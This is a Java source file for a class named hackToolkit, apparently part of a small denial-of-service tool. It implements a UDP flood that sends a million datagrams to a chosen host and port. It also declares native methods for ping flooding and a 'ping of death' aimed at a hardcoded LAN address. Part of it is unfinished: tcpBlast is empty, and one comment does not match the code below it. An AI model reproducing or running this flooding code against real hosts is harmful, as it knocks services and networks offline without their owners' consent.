package hackit;

import java.net.*;
import java.io.*;
import java.nio.*;
import java.nio.channels.*;

public class hackToolkit {
  public native void nicePing(String src,String target, byte[] payLoad);
  public native void loopPing(String src, String target, byte[] payLoad,long iterations);
  public native void pingOfDeath(String src, String dest, byte[] payLoad);
  private Frame1 ref;
  private InetAddress target;
  private int targetPort;

  public hackToolkit(Frame1 ref) {
    this.ref = ref;
  }
  public void setRemoteComputer(InetAddress target,int targetPort){
    this.target = target;
    this.targetPort = targetPort;
  }
  public void udpBlast(){
    DynamicThread dThread = new DynamicThread(new Runnable(){
      public void run(){
        try {
          DatagramChannel dChannel = DatagramChannel.open();
          ByteBuffer src = ByteBuffer.allocateDirect(256);
          for(int i=0;i<64;i++)
            src.putInt(1);
          src.flip();
          for(int i=0;i<1000000;i++){
            dChannel.send(src, new InetSocketAddress(target, targetPort));
            src.rewind();
          }
        }catch (IOException ex) {System.out.println("IOException in dChannel():" + ex);}
      }},false);
    dThread.dispatch();
  }
  public void tcpBlast(){

  }
  public void ping(String src,String target,byte[] payLoad){
    nicePing(src,target,payLoad);
  }
  public void pingLoop(String src,String target,byte[] payLoad, long iterations){
    loopPing(src,target,payLoad,iterations);
  }
  public void pingDeath(){
    //this should loop and enumerate the ports on the host//
    byte[] data = new byte[1024];
    for(int i=0;i<256;i++)
      data[i] = 1;
    pingOfDeath("localhost","192.168.1.101",data);
  }
  static {
    System.loadLibrary("HackToolkit");
  }
}